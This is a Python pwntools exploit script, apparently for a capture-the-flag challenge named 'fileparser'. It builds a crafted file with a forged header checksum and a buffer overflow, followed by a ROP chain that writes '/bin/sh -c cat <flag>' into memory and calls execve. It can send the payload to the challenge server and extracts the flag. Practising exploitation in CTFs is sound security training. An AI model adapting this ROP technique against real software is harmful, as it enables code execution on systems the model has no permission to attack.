#!/usr/bin/env python3

from __future__ import annotations

import base64
import re
import struct
from pathlib import Path

from pwn import ELF, args, context, flat, gdb, log, process, remote


BASE_DIR = Path(__file__).resolve().parent
BINARY_PATH = BASE_DIR / "fileparser"
PAYLOAD_PATH = BASE_DIR / "payload.bin"

context.binary = elf = ELF(str(BINARY_PATH), checksec=False)
context.arch = "amd64"
context.log_level = "info"
context.timeout = 3

MAGIC = 0x07030301
OFFSET = 0x118
BSS = 0x4B6000

POP_RAX = 0x429BC3
POP_RDI = 0x47AE62
POP_RSI = 0x47F6CF
XCHG_RDX_RAX = 0x41E41A
SYSCALL_RET = 0x412AD6


def checksum(length: int) -> int:
    header_qword = MAGIC | (length << 32)
    return (~((header_qword * 0xAABBCCDDDEADBEEF) & 0xFFFFFFFFFFFFFFFF)) & 0xFFFFFFFFFFFFFFFF


MOV_QWORD_PTR_RDI_RAX = 0x43FBAB


def write_qword(addr: int, value: bytes) -> bytes:
    return flat(
        POP_RDI,
        addr,
        POP_RAX,
        value.ljust(8, b"\x00"),
        MOV_QWORD_PTR_RDI_RAX,
    )


def write_bytes(addr: int, data: bytes) -> bytes:
    rop = b""
    for i in range(0, len(data), 8):
        rop += write_qword(addr + i, data[i : i + 8])
    return rop


def build_rop(flag_path: bytes) -> bytes:
    if b"\x00" in flag_path:
        raise ValueError("flag path must not contain embedded NUL")

    shell = b"/bin/sh\x00"
    dash_c = b"-c\x00"
    command = b"cat " + flag_path + b"\x00"
    argv_addr = BSS + 0x80

    rop = b""
    rop += write_bytes(BSS, shell)
    rop += write_bytes(BSS + 0x10, dash_c)
    rop += write_bytes(BSS + 0x20, command)
    rop += write_qword(argv_addr + 0x00, struct.pack("<Q", BSS))
    rop += write_qword(argv_addr + 0x08, struct.pack("<Q", BSS + 0x10))
    rop += write_qword(argv_addr + 0x10, struct.pack("<Q", BSS + 0x20))
    rop += write_qword(argv_addr + 0x18, struct.pack("<Q", 0))
    rop += flat(
        POP_RDI,
        BSS,
        POP_RSI,
        argv_addr,
        POP_RAX,
        0,
        XCHG_RDX_RAX,
        POP_RAX,
        59,
        SYSCALL_RET,
    )
    return rop


def build_file() -> bytes:
    flag_path = (args.FLAG or "/flag.txt").encode()
    rop = build_rop(flag_path)
    body = b"A" * OFFSET + rop
    length = len(body)
    data = struct.pack("<IIQ", MAGIC, length, checksum(length)) + body
    PAYLOAD_PATH.write_bytes(data)
    return data


def start():
    payload = build_file()
    if args.REMOTE:
        host = args.HOST or "fileparser-2172ac5c2489.chall.nnsc.tf"
        port = int(args.PORT or 1337)
        io = remote(host, port, ssl=True)
        io.recvuntil(b"Send over your file as base64: ")
        io.sendline(base64.b64encode(payload))
        return io

    argv = [str(BINARY_PATH), str(PAYLOAD_PATH)]
    if args.GDB:
        return gdb.debug(
            argv,
            gdbscript="""
            set pagination off
            continue
            """,
        )

    return process(argv)


def exploit(io):
    data = io.recvrepeat(2)
    match = re.search(rb"NNS\{[^}\n]+\}", data)
    if not match:
        raise RuntimeError(f"flag marker not found in output: {data!r}")
    log.success(f"flag = {match.group(0).decode()}")
    print(data.decode("latin1", errors="replace"), end="")


def main():
    io = start()
    exploit(io)


if __name__ == "__main__":
    main()
